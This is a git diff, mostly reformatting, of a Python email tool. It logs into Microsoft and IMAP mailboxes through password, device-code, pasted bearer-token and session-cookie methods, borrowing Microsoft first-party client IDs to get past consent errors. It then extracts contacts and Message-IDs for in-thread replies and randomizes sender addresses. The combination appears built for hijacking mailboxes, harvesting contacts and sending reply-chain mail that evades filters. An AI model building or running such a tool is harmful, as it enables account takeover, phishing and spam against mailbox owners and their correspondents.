@@ -69,7 +69,6 @@ import socket
 import subprocess
 import sys
 import time
-import threading
 from collections import defaultdict
 from dataclasses import dataclass
 from datetime import datetime, timedelta
@@ -82,6 +81,7 @@ from typing import Optional, Generator
 
 log = logging.getLogger(__name__)
 
+
 # ─────────────────────────────────────────────────────────────────
 # AUTO-INSTALL
 # ─────────────────────────────────────────────────────────────────
@@ -91,12 +91,23 @@ def _ensure(pkg, pip_name=None):
     except ImportError:
         try:
             subprocess.check_call(
-                [sys.executable, "-m", "pip", "install", pip_name or pkg,
-                 "-q", "--break-system-packages", "--disable-pip-version-check"],
-                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=120,
+                [
+                    sys.executable,
+                    "-m",
+                    "pip",
+                    "install",
+                    pip_name or pkg,
+                    "-q",
+                    "--break-system-packages",
+                    "--disable-pip-version-check",
+                ],
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+                timeout=120,
             )
         except Exception:
             pass
+
 
 for _pkg in [("msal", "msal"), ("requests", "requests"), ("dns.resolver", "dnspython")]:
     try:
@@ -106,6 +117,7 @@ for _pkg in [("msal", "msal"), ("requests", "requests"), ("dns.resolver", "dnspy
 
 try:
     import msal as _msal
+
     _HAS_MSAL = True
     _MSAL_ERR = None
 except Exception as _e:
@@ -114,12 +126,14 @@ except Exception as _e:
 
 try:
     import requests as _req
+
     _HAS_REQUESTS = True
 except ImportError:
     _HAS_REQUESTS = False
 
 try:
     import dns.resolver as _dns
+
     _HAS_DNS = True
 except ImportError:
     _HAS_DNS = False
@@ -140,11 +154,21 @@ _UA = (
 )
 
 # Consumer Microsoft domains — use /consumers authority
-MS_CONSUMER_DOMAINS = frozenset({
-    "outlook.com", "hotmail.com", "hotmail.co.uk", "hotmail.fr",
-    "live.com", "live.ca", "live.co.uk", "live.fr", "live.com.au",
-    "msn.com", "passport.com",
-})
+MS_CONSUMER_DOMAINS = frozenset(
+    {
+        "outlook.com",
+        "hotmail.com",
+        "hotmail.co.uk",
+        "hotmail.fr",
+        "live.com",
+        "live.ca",
+        "live.co.uk",
+        "live.fr",
+        "live.com.au",
+        "msn.com",
+        "passport.com",
+    }
+)
 
 # Microsoft Graph scopes needed for read + send
 MS_SCOPES_FULL = [
@@ -163,9 +187,9 @@ MS_SCOPES_FALLBACK = [
 # solid fallback. Microsoft Office is kept last — some tenants now return
 # AADSTS65002 ("first-party consent") when it's used by third-party tools.
 MS_APPS = [
-    ("Azure PowerShell",   "1950a258-227b-4e31-a9cf-717495945fc2"),
-    ("Azure CLI",          "04b07795-8ddb-461a-bbee-02f9e1bf7b46"),
-    ("Microsoft Office",   "d3590ed6-52b3-4102-aeff-aad2292ab01c"),
+    ("Azure PowerShell", "1950a258-227b-4e31-a9cf-717495945fc2"),
+    ("Azure CLI", "04b07795-8ddb-461a-bbee-02f9e1bf7b46"),
+    ("Microsoft Office", "d3590ed6-52b3-4102-aeff-aad2292ab01c"),
 ]
 
 # IMAP provider table: domain → (name, imap_host, imap_port,
@@ -173,97 +197,212 @@ MS_APPS = [
 #                                 smtp_host, smtp_port)
 PROVIDERS: dict = {
     # Gmail / Google Workspace
-    "gmail.com":       ("Gmail",       "imap.gmail.com",            993, True,
-                        "https://myaccount.google.com/apppasswords",
-                        "smtp.gmail.com", 587),
-    "googlemail.com":  ("Gmail",       "imap.gmail.com",            993, True,
-                        "https://myaccount.google.com/apppasswords",
-                        "smtp.gmail.com", 587),
-
+    "gmail.com": (
+        "Gmail",
+        "imap.gmail.com",
+        993,
+        True,
+        "https://myaccount.google.com/apppasswords",
+        "smtp.gmail.com",
+        587,
+    ),
+    "googlemail.com": (
+        "Gmail",
+        "imap.gmail.com",
+        993,
+        True,
+        "https://myaccount.google.com/apppasswords",
+        "smtp.gmail.com",
+        587,
+    ),
     # Yahoo
-    "yahoo.com":       ("Yahoo",       "imap.mail.yahoo.com",       993, True,
-                        "https://login.yahoo.com/account/security",
-                        "smtp.mail.yahoo.com", 587),
-    "ymail.com":       ("Yahoo",       "imap.mail.yahoo.com",       993, True,
-                        "https://login.yahoo.com/account/security",
-                        "smtp.mail.yahoo.com", 587),
-    "yahoo.co.uk":     ("Yahoo UK",    "imap.mail.yahoo.com",       993, True,
-                        "https://login.yahoo.com/account/security",
-                        "smtp.mail.yahoo.com", 587),
-    "yahoo.co.jp":     ("Yahoo JP",    "imap.mail.yahoo.com",       993, True,
-                        "https://login.yahoo.com/account/security",
-                        "smtp.mail.yahoo.com", 587),
-    "yahoo.com.au":    ("Yahoo AU",    "imap.mail.yahoo.com",       993, True,
-                        "https://login.yahoo.com/account/security",
-                        "smtp.mail.yahoo.com", 587),
-
+    "yahoo.com": (
+        "Yahoo",
+        "imap.mail.yahoo.com",
+        993,
+        True,
+        "https://login.yahoo.com/account/security",
+        "smtp.mail.yahoo.com",
+        587,
+    ),
+    "ymail.com": (
+        "Yahoo",
+        "imap.mail.yahoo.com",
+        993,
+        True,
+        "https://login.yahoo.com/account/security",
+        "smtp.mail.yahoo.com",
+        587,
+    ),
+    "yahoo.co.uk": (
+        "Yahoo UK",
+        "imap.mail.yahoo.com",
+        993,
+        True,
+        "https://login.yahoo.com/account/security",
+        "smtp.mail.yahoo.com",
+        587,
+    ),
+    "yahoo.co.jp": (
+        "Yahoo JP",
+        "imap.mail.yahoo.com",
+        993,
+        True,
+        "https://login.yahoo.com/account/security",
+        "smtp.mail.yahoo.com",
+        587,
+    ),
+    "yahoo.com.au": (
+        "Yahoo AU",
+        "imap.mail.yahoo.com",
+        993,
+        True,
+        "https://login.yahoo.com/account/security",
+        "smtp.mail.yahoo.com",
+        587,
+    ),
     # AOL
-    "aol.com":         ("AOL",         "imap.aol.com",              993, True,
-                        "https://login.aol.com/account/security",
-                        "smtp.aol.com", 587),
-
+    "aol.com": (
+        "AOL",
+        "imap.aol.com",
+        993,
+        True,
+        "https://login.aol.com/account/security",
+        "smtp.aol.com",
+        587,
+    ),
     # Apple iCloud
-    "icloud.com":      ("iCloud",      "imap.mail.me.com",          993, True,
-                        "https://appleid.apple.com",
-                        "smtp.mail.me.com", 587),
-    "me.com":          ("iCloud",      "imap.mail.me.com",          993, True,
-                        "https://appleid.apple.com",
-                        "smtp.mail.me.com", 587),
-    "mac.com":         ("iCloud",      "imap.mail.me.com",          993, True,
-                        "https://appleid.apple.com",
-                        "smtp.mail.me.com", 587),
-
+    "icloud.com": (
+        "iCloud",
+        "imap.mail.me.com",
+        993,
+        True,
+        "https://appleid.apple.com",
+        "smtp.mail.me.com",
+        587,
+    ),
+    "me.com": (
+        "iCloud",
+        "imap.mail.me.com",
+        993,
+        True,
+        "https://appleid.apple.com",
+        "smtp.mail.me.com",
+        587,
+    ),
+    "mac.com": (
+        "iCloud",
+        "imap.mail.me.com",
+        993,
+        True,
+        "https://appleid.apple.com",
+        "smtp.mail.me.com",
+        587,
+    ),
     # Zoho
-    "zoho.com":        ("Zoho",        "imap.zoho.com",             993, False, "",
-                        "smtp.zoho.com", 587),
-    "zoho.eu":         ("Zoho EU",     "imap.zoho.eu",              993, False, "",
-                        "smtp.zoho.eu", 587),
-    "zohomail.com":    ("Zoho",        "imap.zoho.com",             993, False, "",
-                        "smtp.zoho.com", 587),
-
+    "zoho.com": ("Zoho", "imap.zoho.com", 993, False, "", "smtp.zoho.com", 587),
+    "zoho.eu": ("Zoho EU", "imap.zoho.eu", 993, False, "", "smtp.zoho.eu", 587),
+    "zohomail.com": ("Zoho", "imap.zoho.com", 993, False, "", "smtp.zoho.com", 587),
     # Fastmail
-    "fastmail.com":    ("Fastmail",    "imap.fastmail.com",         993, True,
-                        "https://app.fastmail.com/settings/security/devicekeys/new",
-                        "smtp.fastmail.com", 587),
-    "fastmail.fm":     ("Fastmail",    "imap.fastmail.com",         993, True,
-                        "https://app.fastmail.com/settings/security/devicekeys/new",
-                        "smtp.fastmail.com", 587),
-
+    "fastmail.com": (
+        "Fastmail",
+        "imap.fastmail.com",
+        993,
+        True,
+        "https://app.fastmail.com/settings/security/devicekeys/new",
+        "smtp.fastmail.com",
+        587,
+    ),
+    "fastmail.fm": (
+        "Fastmail",
+        "imap.fastmail.com",
+        993,
+        True,
+        "https://app.fastmail.com/settings/security/devicekeys/new",
+        "smtp.fastmail.com",
+        587,
+    ),
     # GMX / Web.de
-    "gmx.com":         ("GMX",         "imap.gmx.com",              993, False, "",
-                        "mail.gmx.com", 587),
-    "gmx.net":         ("GMX",         "imap.gmx.net",              993, False, "",
-                        "mail.gmx.net", 587),
-    "gmx.de":          ("GMX DE",      "imap.gmx.net",              993, False, "",
-                        "mail.gmx.net", 587),
-    "web.de":          ("Web.de",      "imap.web.de",               993, False, "",
-                        "smtp.web.de", 587),
-
+    "gmx.com": ("GMX", "imap.gmx.com", 993, False, "", "mail.gmx.com", 587),
+    "gmx.net": ("GMX", "imap.gmx.net", 993, False, "", "mail.gmx.net", 587),
+    "gmx.de": ("GMX DE", "imap.gmx.net", 993, False, "", "mail.gmx.net", 587),
+    "web.de": ("Web.de", "imap.web.de", 993, False, "", "smtp.web.de", 587),
     # ProtonMail (requires Bridge running locally)
-    "protonmail.com":  ("ProtonMail",  "127.0.0.1",                1143, False,
-                        "https://account.proton.me/settings#import-export",
-                        "127.0.0.1", 1025),
-    "proton.me":       ("ProtonMail",  "127.0.0.1",                1143, False,
-                        "https://account.proton.me/settings#import-export",
-                        "127.0.0.1", 1025),
-    "pm.me":           ("ProtonMail",  "127.0.0.1",                1143, False,
-                        "https://account.proton.me/settings#import-export",
-                        "127.0.0.1", 1025),
-
+    "protonmail.com": (
+        "ProtonMail",
+        "127.0.0.1",
+        1143,
+        False,
+        "https://account.proton.me/settings#import-export",
+        "127.0.0.1",
+        1025,
+    ),
+    "proton.me": (
+        "ProtonMail",
+        "127.0.0.1",
+        1143,
+        False,
+        "https://account.proton.me/settings#import-export",
+        "127.0.0.1",
+        1025,
+    ),
+    "pm.me": (
+        "ProtonMail",
+        "127.0.0.1",
+        1143,
+        False,
+        "https://account.proton.me/settings#import-export",
+        "127.0.0.1",
+        1025,
+    ),
     # Microsoft consumer (also routed through IMAP if needed)
-    "outlook.com":     ("Outlook",     "outlook.office365.com",     993, False, "",
-                        "smtp.office365.com", 587),
-    "hotmail.com":     ("Hotmail",     "outlook.office365.com",     993, False, "",
-                        "smtp.office365.com", 587),
-    "live.com":        ("Live",        "outlook.office365.com",     993, False, "",
-                        "smtp.office365.com", 587),
-    "hotmail.co.uk":   ("Hotmail UK",  "outlook.office365.com",     993, False, "",
-                        "smtp.office365.com", 587),
-
+    "outlook.com": (
+        "Outlook",
+        "outlook.office365.com",
+        993,
+        False,
+        "",
+        "smtp.office365.com",
+        587,
+    ),
+    "hotmail.com": (
+        "Hotmail",
+        "outlook.office365.com",
+        993,
+        False,
+        "",
+        "smtp.office365.com",
+        587,
+    ),
+    "live.com": (
+        "Live",
+        "outlook.office365.com",
+        993,
+        False,
+        "",
+        "smtp.office365.com",
+        587,
+    ),
+    "hotmail.co.uk": (
+        "Hotmail UK",
+        "outlook.office365.com",
+        993,
+        False,
+        "",
+        "smtp.office365.com",
+        587,
+    ),
     # GoDaddy / Workspace Email
     # GoDaddy routes mail through secureserver.net
-    "secureserver.net":("GoDaddy",     "imap.secureserver.net",     993, False, "",
-                        "smtpout.secureserver.net", 465),
+    "secureserver.net": (
+        "GoDaddy",
+        "imap.secureserver.net",
+        993,
+        False,
+        "",
+        "smtpout.secureserver.net",
+        465,
+    ),
 }
 
 # MX record hints → provider routing
@@ -271,49 +410,73 @@ PROVIDERS: dict = {
 # Value = "ms" (Office 365) or a domain key in PROVIDERS
 MX_HINTS = {
     # Microsoft / O365
-    "protection.outlook":      "ms",
+    "protection.outlook": "ms",
     "mail.protection.outlook": "ms",
-    "outlook.com":             "ms",
-    "pphosted.com":            "ms",
-    "microsoft":               "ms",
-    "messagelabs.com":         "ms",
-    "mimecast":                "ms",
-    "barracuda":               "ms",
-    "eo.outlook.com":          "ms",
+    "outlook.com": "ms",
+    "pphosted.com": "ms",
+    "microsoft": "ms",
+    "messagelabs.com": "ms",
+    "mimecast": "ms",
+    "barracuda": "ms",
+    "eo.outlook.com": "ms",
     # Google
-    "aspmx.l.google":          "gmail.com",
-    "googlemail.com":          "gmail.com",
-    "google.com":              "gmail.com",
+    "aspmx.l.google": "gmail.com",
+    "googlemail.com": "gmail.com",
+    "google.com": "gmail.com",
     # Yahoo
-    "yahoodns.net":            "yahoo.com",
-    "yahoo.com":               "yahoo.com",
+    "yahoodns.net": "yahoo.com",
+    "yahoo.com": "yahoo.com",
     # Other known providers
-    "icloud.com":              "icloud.com",
-    "fastmail":                "fastmail.com",
-    "zoho.com":                "zoho.com",
+    "icloud.com": "icloud.com",
+    "fastmail": "fastmail.com",
+    "zoho.com": "zoho.com",
     # GoDaddy
-    "secureserver.net":        "secureserver.net",
+    "secureserver.net": "secureserver.net",
 }
 
 # No-reply / generic / bot patterns
 _GENERIC_PATTERNS = [
-    r'^noreply',        r'^no-reply',        r'^no\.reply',
-    r'^donotreply',     r'^do-not-reply',    r'^do\.not\.reply',
-    r'^postmaster',     r'^mailer-daemon',   r'^bounced?@',
-    r'^daemon@',        r'^notifications?@', r'^notify@',
-    r'^alerts?@',       r'^newsletter',      r'^news@',
-    r'^updates?@',      r'^digest@',         r'^automated',
-    r'^auto-',          r'^system@',         r'^service@',
-    r'^feedback@',      r'^survey',          r'^billing@',
-    r'^receipt',        r'^invoice@',        r'^calendar-notification',
-    r'^noreply-',       r'^microsoftexchange', r'^microsoft365',
-    r'^msonlineservicesteam', r'^microsoft-noreply',
-    r'^unsubscribe',    r'^bounce',          r'^reply-to-',
-    r'@.+\.(mailchimp|sendgrid|amazonses|constantcontact|hubspot|'
-    r'salesforce|marketo|mandrillapp|mailgun|campaign-archive|'
-    r'createsend|klaviyo|brevo|sendinblue|mailerlite)\.com$',
+    r"^noreply",
+    r"^no-reply",
+    r"^no\.reply",
+    r"^donotreply",
+    r"^do-not-reply",
+    r"^do\.not\.reply",
+    r"^postmaster",
+    r"^mailer-daemon",
+    r"^bounced?@",
+    r"^daemon@",
+    r"^notifications?@",
+    r"^notify@",
+    r"^alerts?@",
+    r"^newsletter",
+    r"^news@",
+    r"^updates?@",
+    r"^digest@",
+    r"^automated",
+    r"^auto-",
+    r"^system@",
+    r"^service@",
+    r"^feedback@",
+    r"^survey",
+    r"^billing@",
+    r"^receipt",
+    r"^invoice@",
+    r"^calendar-notification",
+    r"^noreply-",
+    r"^microsoftexchange",
+    r"^microsoft365",
+    r"^msonlineservicesteam",
+    r"^microsoft-noreply",
+    r"^unsubscribe",
+    r"^bounce",
+    r"^reply-to-",
+    r"@.+\.(mailchimp|sendgrid|amazonses|constantcontact|hubspot|"
+    r"salesforce|marketo|mandrillapp|mailgun|campaign-archive|"
+    r"createsend|klaviyo|brevo|sendinblue|mailerlite)\.com$",
 ]
 _generic_re = [re.compile(p, re.I) for p in _GENERIC_PATTERNS]
+
 
 def is_generic(addr: str) -> bool:
     """Return True if address looks like a no-reply / automated sender."""
@@ -324,23 +487,49 @@ def is_generic(addr: str) -> bool:
 # LOCAL-PART RANDOMIZER
 # ─────────────────────────────────────────────────────────────────
 _RANDOM_STYLES = {
-    "alpha":    lambda n: "".join(random.choices(string.ascii_lowercase, k=n)),
-    "digits":   lambda n: "".join(random.choices(string.digits, k=n)),
-    "alphanum": lambda n: "".join(random.choices(string.ascii_lowercase + string.digits, k=n)),
-    "dotted":   lambda n: ".".join([
-        "".join(random.choices(string.ascii_lowercase, k=random.randint(3, 6)))
-        for _ in range(2)
-    ]),
-    "word": lambda n: random.choice([
-        "sales", "hello", "info", "contact", "support", "team",
-        "office", "admin", "mail", "hi", "hey", "reach", "business",
-    ]) + random.choice(["", str(random.randint(1, 99))]),
+    "alpha": lambda n: "".join(random.choices(string.ascii_lowercase, k=n)),
+    "digits": lambda n: "".join(random.choices(string.digits, k=n)),
+    "alphanum": lambda n: "".join(
+        random.choices(string.ascii_lowercase + string.digits, k=n)
+    ),
+    "dotted": lambda n: ".".join(
+        [
+            "".join(random.choices(string.ascii_lowercase, k=random.randint(3, 6)))
+            for _ in range(2)
+        ]
+    ),
+    "word": lambda n: (
+        random.choice(
+            [
+                "sales",
+                "hello",
+                "info",
+                "contact",
+                "support",
+                "team",
+                "office",
+                "admin",
+                "mail",
+                "hi",
+                "hey",
+                "reach",
+                "business",
+            ]
+        )
+        + random.choice(["", str(random.randint(1, 99))])
+    ),
     "name": lambda n: (
-        random.choice(["john", "jane", "alex", "sam", "mike", "sarah", "david", "lisa"])
-        + random.choice([".", "_", ""])
-        + random.choice(["smith", "jones", "brown", "white", "harris", "clark", ""])
-    ).strip("._ ") or "info",
+        (
+            random.choice(
+                ["john", "jane", "alex", "sam", "mike", "sarah", "david", "lisa"]
+            )
+            + random.choice([".", "_", ""])
+            + random.choice(["smith", "jones", "brown", "white", "harris", "clark", ""])
+        ).strip("._ ")
+        or "info"
+    ),
 }
+
 
 def randomize_local(from_email: str, style: str = "alphanum", length: int = 8) -> str:
     """
@@ -357,8 +546,10 @@ def randomize_local(from_email: str, style: str = "alphanum", length: int = 8) -
     if "@" not in from_email:
         return from_email
     domain = from_email.split("@", 1)[1]
-    fn     = _RANDOM_STYLES.get(style, _RANDOM_STYLES["alphanum"])
-    local  = fn(length).strip("._ ") or "".join(random.choices(string.ascii_lowercase, k=6))
+    fn = _RANDOM_STYLES.get(style, _RANDOM_STYLES["alphanum"])
+    local = fn(length).strip("._ ") or "".join(
+        random.choices(string.ascii_lowercase, k=6)
+    )
     return f"{local}@{domain}"
 
 
@@ -366,20 +557,22 @@ def randomize_local(from_email: str, style: str = "alphanum", length: int = 8) -
 # DATA STRUCTURES
 # ═══════════════════════════════════════════════════════════════
 
+
 @dataclass
 class B2BLead:
     """One deduplicated contact extracted from an inbox."""
-    email:         str
-    name:          str
-    last_subject:  str
-    last_date:     str
-    message_id:    str   # most recent Message-ID (for In-Reply-To)
-    thread_ids:    list  # all Message-IDs from this sender (oldest first)
-    folder:        str
-    msg_count:     int   = 1
-    is_html:       bool  = False
-    has_att:       bool  = False
-    score:         int   = 0   # 0-100 deliverability score
+
+    email: str
+    name: str
+    last_subject: str
+    last_date: str
+    message_id: str  # most recent Message-ID (for In-Reply-To)
+    thread_ids: list  # all Message-IDs from this sender (oldest first)
+    folder: str
+    msg_count: int = 1
+    is_html: bool = False
+    has_att: bool = False
+    score: int = 0  # 0-100 deliverability score
 
     def to_dict(self) -> dict:
         return {k: getattr(self, k) for k in self.__dataclass_fields__}  # type: ignore
@@ -388,16 +581,17 @@ class B2BLead:
 @dataclass
 class B2BAccount:
     """Authenticated session — holds credentials for extraction + send."""
-    email:      str
-    provider:   dict
-    ms_token:   Optional[str]            = None  # MS Graph Bearer token
-    ms_token_expires: float              = 0.0   # epoch timestamp
-    ms_refresh: Optional[str]            = None  # refresh token if available
-    imap_conn:  Optional[imaplib.IMAP4]  = None
-    smtp_host:  str  = ""
-    smtp_port:  int  = 587
-    smtp_user:  str  = ""
-    smtp_pass:  str  = ""
+
+    email: str
+    provider: dict
+    ms_token: Optional[str] = None  # MS Graph Bearer token
+    ms_token_expires: float = 0.0  # epoch timestamp
+    ms_refresh: Optional[str] = None  # refresh token if available
+    imap_conn: Optional[imaplib.IMAP4] = None
+    smtp_host: str = ""
+    smtp_port: int = 587
+    smtp_user: str = ""
+    smtp_pass: str = ""
 
     def ms_token_valid(self) -> bool:
         """True if we have a Graph token with >60 seconds remaining."""
@@ -407,6 +601,7 @@ class B2BAccount:
 # ═══════════════════════════════════════════════════════════════
 # PROVIDER DETECTION
 # ═══════════════════════════════════════════════════════════════
+
 
 def detect(email_addr: str) -> dict:
     """
@@ -438,39 +633,54 @@ def detect(email_addr: str) -> dict:
         return {
             "type": "ms",
             "provider": "microsoft365",
-            "name": name, "domain": domain,
-            "imap_host": "outlook.office365.com", "imap_port": 993,
-            "smtp_host": "smtp.office365.com",    "smtp_port": 587,
-            "needs_app_pw": False, "app_pw_url": "",
-            "is_google": False, "is_godaddy": False,
+            "name": name,
+            "domain": domain,
+            "imap_host": "outlook.office365.com",
+            "imap_port": 993,
+            "smtp_host": "smtp.office365.com",
+            "smtp_port": 587,
+            "needs_app_pw": False,
+            "app_pw_url": "",
+            "is_google": False,
+            "is_godaddy": False,
             "auth_order": ["device_code", "token", "password"],
             "auth_hints": {
                 "password": "Works if MFA is disabled. Use App Password if MFA is on (account.microsoft.com/security).",
                 "token": "Paste a Bearer token from browser dev tools (F12 → Network → any graph.microsoft.com request → Authorization header).",
                 "device_code": "Best for MFA/SSO — opens microsoft.com/devicelogin with a one-time code. No app password needed.",
                 "cookie": "Paste Outlook web session cookies from browser dev tools for direct Graph API access.",
-            }
+            },
         }
 
     def _imap_result(name, ih, ip, app_pw, app_url, sh, sp, **extra):
-        is_g  = "gmail" in ih or "google" in ih or extra.get("is_google")
+        is_g = "gmail" in ih or "google" in ih or extra.get("is_google")
         is_gd = "secureserver" in ih or extra.get("is_godaddy")
-        prov  = "google" if is_g else ("godaddy" if is_gd else "imap")
-        hints_pw = "App Password required — " + (app_url if app_url else "check your provider security settings") if app_pw else "Use your regular email password."
+        prov = "google" if is_g else ("godaddy" if is_gd else "imap")
+        hints_pw = (
+            "App Password required — "
+            + (app_url if app_url else "check your provider security settings")
+            if app_pw
+            else "Use your regular email password."
+        )
         r = {
             "type": "imap",
             "provider": prov,
-            "name": name, "domain": domain,
-            "imap_host": ih, "imap_port": ip,
-            "smtp_host": sh, "smtp_port": sp,
-            "needs_app_pw": app_pw, "app_pw_url": app_url,
-            "is_google": is_g, "is_godaddy": is_gd,
+            "name": name,
+            "domain": domain,
+            "imap_host": ih,
+            "imap_port": ip,
+            "smtp_host": sh,
+            "smtp_port": sp,
+            "needs_app_pw": app_pw,
+            "app_pw_url": app_url,
+            "is_google": is_g,
+            "is_godaddy": is_gd,
             "auth_order": ["password", "token"] if not is_g else ["password", "token"],
             "auth_hints": {
                 "password": hints_pw,
                 "token": "Paste OAuth Bearer token from browser dev tools.",
                 "cookie": "Import IMAP session from browser cookies.",
-            }
+            },
         }
         r.update(extra)
         return r
@@ -484,8 +694,9 @@ def detect(email_addr: str) -> dict:
         n, ih, ip, app_pw, app_url, sh, sp = PROVIDERS[domain]
         is_g = "gmail" in ih or "google" in ih
         is_gd = "secureserver" in ih
-        return _imap_result(n, ih, ip, app_pw, app_url, sh, sp,
-                            is_google=is_g, is_godaddy=is_gd)
+        return _imap_result(
+            n, ih, ip, app_pw, app_url, sh, sp, is_google=is_g, is_godaddy=is_gd
+        )
 
     # 3. MX lookup
     mx = _resolve_mx(domain)
@@ -500,8 +711,15 @@ def detect(email_addr: str) -> dict:
                     is_g = "gmail" in ih or "google" in ih
                     is_gd = "secureserver" in ih
                     return _imap_result(
-                        f"{n} ({domain})", ih, ip, app_pw, app_url, sh, sp,
-                        is_google=is_g, is_godaddy=is_gd,
+                        f"{n} ({domain})",
+                        ih,
+                        ip,
+                        app_pw,
+                        app_url,
+                        sh,
+                        sp,
+                        is_google=is_g,
+                        is_godaddy=is_gd,
                     )
 
     # 4. O365 autodiscover
@@ -513,50 +731,63 @@ def detect(email_addr: str) -> dict:
         try:
             s = socket.create_connection((candidate, 993), timeout=4)
             s.close()
-            smtp_cand = (candidate
-                         .replace("imap.", "smtp.")
-                         .replace("mail.", "smtp."))
+            smtp_cand = candidate.replace("imap.", "smtp.").replace("mail.", "smtp.")
             is_gd = "secureserver" in candidate
             return _imap_result(
-                f"IMAP ({domain})", candidate, 993, False, "",
-                smtp_cand, 587, is_godaddy=is_gd,
+                f"IMAP ({domain})",
+                candidate,
+                993,
+                False,
+                "",
+                smtp_cand,
+                587,
+                is_godaddy=is_gd,
             )
         except Exception:
             continue
 
     # Unknown — return sensible defaults, user can override
     return {
-        "type": "unknown", "provider": "generic",
-        "name": f"Unknown ({domain})", "domain": domain,
-        "imap_host": f"imap.{domain}", "imap_port": 993,
-        "smtp_host": f"smtp.{domain}",  "smtp_port": 587,
-        "needs_app_pw": False, "app_pw_url": "",
-        "is_google": False, "is_godaddy": False,
+        "type": "unknown",
+        "provider": "generic",
+        "name": f"Unknown ({domain})",
+        "domain": domain,
+        "imap_host": f"imap.{domain}",
+        "imap_port": 993,
+        "smtp_host": f"smtp.{domain}",
+        "smtp_port": 587,
+        "needs_app_pw": False,
+        "app_pw_url": "",
+        "is_google": False,
+        "is_godaddy": False,
         "auth_order": ["password", "token"],
         "auth_hints": {
             "password": "Try your email password or app-specific password",
             "token": "Paste a Bearer token from your email client",
             "cookie": "Import session cookies from browser dev tools",
-        }
+        },
     }
 
 
 def _resolve_mx(domain: str) -> list:
     if _HAS_DNS:
         try:
-            return [str(r.exchange).lower().rstrip(".")
-                    for r in _dns.resolve(domain, "MX")]
+            return [
+                str(r.exchange).lower().rstrip(".") for r in _dns.resolve(domain, "MX")
+            ]
         except Exception:
             pass
     try:
         r = subprocess.run(
             ["nslookup", "-type=MX", domain],
-            capture_output=True, text=True, timeout=8,
+            capture_output=True,
+            text=True,
+            timeout=8,
         )
         return [
-            l.split("=")[-1].strip().rstrip(".")
-            for l in r.stdout.splitlines()
-            if "mail exchanger" in l.lower()
+            line.split("=")[-1].strip().rstrip(".")
+            for line in r.stdout.splitlines()
+            if "mail exchanger" in line.lower()
         ]
     except Exception:
         return []
@@ -582,6 +813,7 @@ def _o365_autodiscover(domain: str) -> bool:
 # ═══════════════════════════════════════════════════════════════
 # AUTHENTICATION — METHOD 1: USERNAME + PASSWORD
 # ═══════════════════════════════════════════════════════════════
+
 
 def login_ms_ropc(email_addr: str, password: str) -> tuple:
     """
@@ -613,14 +845,16 @@ def login_ms_ropc(email_addr: str, password: str) -> tuple:
         [
             "https://login.microsoftonline.com/consumers",
             "https://login.microsoftonline.com/common",
-        ] if is_consumer else [
+        ]
+        if is_consumer
+        else [
             "https://login.microsoftonline.com/organizations",
             f"https://login.microsoftonline.com/{domain}",
             "https://login.microsoftonline.com/common",
         ]
     )
 
-    scopes   = ["https://graph.microsoft.com/.default"]
+    scopes = ["https://graph.microsoft.com/.default"]
     last_err = ""
 
     for auth in authorities:
@@ -628,20 +862,25 @@ def login_ms_ropc(email_addr: str, password: str) -> tuple:
             try:
                 app = _msal.PublicClientApplication(cid, authority=auth)
                 res = app.acquire_token_by_username_password(
-                    username=email_addr, password=password, scopes=scopes,
+                    username=email_addr,
+                    password=password,
+                    scopes=scopes,
                 )
                 if "access_token" in res:
-                    token  = res["access_token"]
+                    token = res["access_token"]
                     rtoken = res.get("refresh_token")
-                    exp    = time.time() + int(res.get("expires_in", 3600))
+                    exp = time.time() + int(res.get("expires_in", 3600))
                     # Verify the token actually has mail scope
                     h = {"Authorization": f"Bearer {token}"}
                     chk = _req.get(
                         f"{GRAPH}/me/mailFolders/Inbox?$select=totalItemCount",
-                        headers=h, timeout=12,
+                        headers=h,
+                        timeout=12,
                     )
                     if chk.status_code == 200:
-                        log.info("[B2B] ROPC auth OK via %s for %s", app_name, email_addr)
+                        log.info(
+                            "[B2B] ROPC auth OK via %s for %s", app_name, email_addr
+                        )
                         return token, rtoken, exp, None
                     if chk.status_code == 403:
                         last_err = f"{app_name}: token valid but no mail scope"
@@ -660,10 +899,15 @@ def login_ms_ropc(email_addr: str, password: str) -> tuple:
                     return None, None, 0, "Account disabled."
                 if "AADSTS50055" in e:
                     return None, None, 0, "Password expired — reset it first."
-                if any(x in e for x in [
-                    "AADSTS50076", "AADSTS50079",
-                    "AADSTS50158", "AADSTS7000112",
-                ]):
+                if any(
+                    x in e
+                    for x in [
+                        "AADSTS50076",
+                        "AADSTS50079",
+                        "AADSTS50158",
+                        "AADSTS7000112",
+                    ]
+                ):
                     return None, None, 0, "mfa_required"
                 if "AADSTS50020" in e:
                     # Personal account used on org tenant or vice versa — try next authority
@@ -691,16 +935,19 @@ def _ms_refresh_token(refresh_token: str, email_addr: str) -> tuple:
     """
     if not _HAS_MSAL:
         return None, None, 0, "msal not available"
-    domain      = email_addr.split("@")[-1].lower()
+    domain = email_addr.split("@")[-1].lower()
     is_consumer = domain in MS_CONSUMER_DOMAINS
-    auth        = ("https://login.microsoftonline.com/consumers"
-                   if is_consumer
-                   else "https://login.microsoftonline.com/organizations")
+    auth = (
+        "https://login.microsoftonline.com/consumers"
+        if is_consumer
+        else "https://login.microsoftonline.com/organizations"
+    )
     for app_name, cid in MS_APPS[:3]:
         try:
             app = _msal.PublicClientApplication(cid, authority=auth)
             res = app.acquire_token_by_refresh_token(
-                refresh_token, scopes=["https://graph.microsoft.com/.default"],
+                refresh_token,
+                scopes=["https://graph.microsoft.com/.default"],
             )
             if "access_token" in res:
                 return (
@@ -718,8 +965,10 @@ def _ms_refresh_token(refresh_token: str, email_addr: str) -> tuple:
 # AUTHENTICATION — METHOD 2: DEVICE CODE (BROWSER POPUP)
 # ═══════════════════════════════════════════════════════════════
 
-def start_device_code(email_addr: str, state: dict,
-                      custom_client_id: str = "", custom_tenant: str = "") -> Optional[dict]:
+
+def start_device_code(
+    email_addr: str, state: dict, custom_client_id: str = "", custom_tenant: str = ""
+) -> Optional[dict]:
     """
     Start device code flow. If custom_client_id is provided, use that app instead of
     the built-in public app list. Required for tenants with admin consent enforcement.
@@ -728,31 +977,36 @@ def start_device_code(email_addr: str, state: dict,
     if not _HAS_MSAL:
         return None
 
-    domain      = email_addr.split("@")[-1].lower()
+    domain = email_addr.split("@")[-1].lower()
     is_consumer = domain in MS_CONSUMER_DOMAINS
 
     # If user provided their own registered Azure app, use it exclusively
     if custom_client_id:
         tenant = custom_tenant or domain
-        auth   = f"https://login.microsoftonline.com/{tenant}"
